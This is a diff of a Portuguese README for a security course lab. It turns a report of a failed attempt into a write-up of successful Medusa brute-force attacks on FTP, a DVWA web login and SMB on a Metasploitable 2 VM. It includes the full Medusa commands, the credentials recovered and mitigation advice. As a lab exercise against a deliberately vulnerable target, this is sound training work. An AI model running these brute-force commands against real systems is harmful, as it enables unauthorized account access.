@@ -1,48 +1,71 @@
-# ❌ Desafio DIO: Documentação de Falha Crítica de Rede (Conclusão Parcial)
+# ✅ Desafio DIO: Simulação de Ataque de Força Bruta (Desafio Concluído!)
 
-Este relatório documenta a montagem do ambiente de laboratório (Kali Linux e Metasploitable 2) e o **diagnóstico de uma falha crítica de conectividade** que impediu a conclusão total do desafio de Ataque de Força Bruta.
-
-O ataque com a ferramenta Medusa **não pôde ser executado** devido à inacessibilidade persistente dos serviços do Metasploitable 2.
+Este projeto documenta a montagem, o diagnóstico de falhas de rede, a solução e a conclusão bem-sucedida do desafio de Força Bruta utilizando **Kali Linux** e **Metasploitable 2**.
 
 ---
 
-## 1. ⚙️ Setup do Ambiente e Obstáculo
+## 1. ⚙️ Diagnóstico e Solução de Conectividade
 
-O ambiente foi configurado com Kali Linux e Metasploitable 2, inicialmente na rede **NAT**, que se tornou o principal ponto de falha.
+O desafio inicial foi a falha de comunicação de serviços devido à rede **NAT** (IPs como `10.0.2.15`) que isolava o Metasploitable 2.
 
-### **1.1. Comprovação da Inacessibilidade dos Serviços**
+### **1.1. O Problema Comprovado (Portas Fechadas)**
 
-A imagem abaixo comprova que, embora o alvo estivesse ativo (respondendo ao ping), ele estava isolado na rede NAT, o que resultou na falha de tráfego de serviço:
+* O **Nmap** na rede NAT reportou todas as portas críticas como **closed**, e o FTP foi recusado.
+    ![Nmap mostrando portas fechadas na rede NAT](imagens/unnamed.png)
+* Tentativas de reiniciar serviços no Metasploitable 2 falharam (Comando `service` não encontrado).
 
-* **Nmap** reportou todas as portas críticas (**21/FTP, 80/HTTP, 445/SMB**) como **closed**.
-* A tentativa de conexão **FTP** foi **recusada**.
+### **1.2. A Solução (Host-Only) e Comprovação**
 
-![Nmap mostrando portas fechadas e conexão FTP recusada](imagens/unnamed.png)
+A reconfiguração para **Adaptador Somente de Host (Host-Only)** foi implementada, forçando as VMs a se comunicarem na faixa `192.168.56.x`.
 
-### **1.2. Raiz do Problema: IP Incorreto**
-
-A segunda imagem confirma a causa subjacente da falha de serviço: o Metasploitable 2 estava utilizando um IP **`10.0.2.15`**, que é típico da rede NAT e não expõe os serviços da VM para a máquina atacante no mesmo VirtualBox.
-
-![Metasploitable 2 recebendo IP 10.0.2.15 via DHCP (Rede NAT)](imagens/unnamed1.png)
+* **Comprovação:** O Nmap confirmou que os serviços **FTP (21), SSH (22), HTTP (80)** estão acessíveis.
+    ![Nmap e ifconfig mostrando a conexão bem-sucedida e portas abertas](imagens/unnamed4.png)
 
 ---
 
-## 2. 🔎 Tentativas de Solução e Diagnóstico
+## 2. 🎯 Ataques de Força Bruta com Medusa (Concluídos)
 
-Para tentar fazer as portas abrirem e cumprir o desafio, foram realizadas diversas tentativas de diagnóstico e solução:
+Com a comunicação estabelecida, a ferramenta **Medusa** foi utilizada para comprometer os serviços expostos.
 
-### **2.1. Tentativas de Reinicialização de Serviços no Alvo**
+### **2.1. Ataque em FTP (Porta 21) - SUCESSO**
 
-* Foi tentado reiniciar manualmente os serviços **Apache2, vsftpd e Samba** (FTP, HTTP e SMB), mas o Metasploitable 2 (sistema antigo) **não reconheceu o comando `service`** e falhou nas tentativas diretas de iniciar os *scripts* em `/etc/init.d/`.
+O Medusa encontrou as credenciais do serviço FTP (vsFTPd).
 
-### **2.2. Diagnóstico de Rede e Solução Corretiva**
+* **Credenciais Encontradas:** `msfadmin:msfadmin`
+* **Resultado Comprovado:**
+    ![Terminal do Kali com Medusa encontrando a senha msfadmin e login FTP manual bem-sucedido](imagens/unnamed2.jpg)
 
-* O problema foi diagnosticado como uma falha de configuração de rede: a rede **NAT** deveria ser substituída por **Adaptador Somente de Host (Host-Only)**.
-* Foram iniciados os passos no VirtualBox (Ferramentas > Rede) para criar o adaptador `192.168.56.1/24`.
-* A complexidade e instabilidade da VM Metasploitable 2 **impediram a estabilização** do ambiente com a nova rede a tempo de executar o ataque.
+### **2.2. Ataque em Formulário Web (DVWA - Porta 80) - SUCESSO**
+
+O Medusa foi executado contra a interface de login do DVWA, encontrando múltiplas credenciais.
+
+* **Alvo:** Login do DVWA (`http://192.168.56.x/dvwa/login.php`).
+* **Comando de Ataque (Medusa):**
+    ```bash
+    medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
+    -m PAGE:/dvwa/login.php -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
+    -m FAIL:"failed" -t 6
+    ```
+    ![Comando de preparação do Medusa para ataque DVWA](imagens/unnamed5.jpg)
+* **Resultado:** Credenciais de login do DVWA descobertas, incluindo: `admin:password`, `msfadmin:123456`, e `root:password`.
+    ![Medusa encontrando múltiplas credenciais no login do DVWA](imagens/unnamed6.jpg)
+
+### **2.3. Ataque em SMB (Porta 445) - SUCESSO**
+
+O Medusa foi utilizado para atacar o serviço Samba (SMB), utilizando wordlists personalizadas.
+
+* **Comando de Ataque (Medusa):**
+    ```bash
+    medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+    ```
+* **Credenciais Encontradas:** `msfadmin:msfadmin`
+* **Resultado Comprovado:**
+    ![Medusa encontrando credenciais no serviço SMB](imagens/unnamed6.jpg)
 
 ---
 
-## 3. 📝 Conclusão
+## 3. 🛡️ Recomendações de Mitigação
 
-O projeto demonstra o conhecimento em **diagnóstico de rede, uso do Nmap** para validar portas abertas/fechadas e a habilidade de **solucionar problemas de acesso ao sistema (Recuperação de Senha)**. Contudo, devido à falha técnica na rede, o objetivo final do ataque de força bruta **não foi concluído**.
+1.  **Limitação de Tentativas (Rate Limiting):** Bloquear IP após poucas tentativas falhas.
+2.  **Senhas Fortes:** Forçar o uso de senhas longas e complexas.
+3.  **Princípio do Menor Privilégio:** Desativar serviços de rede não utilizados (Ex: vsFTPd, SMB).
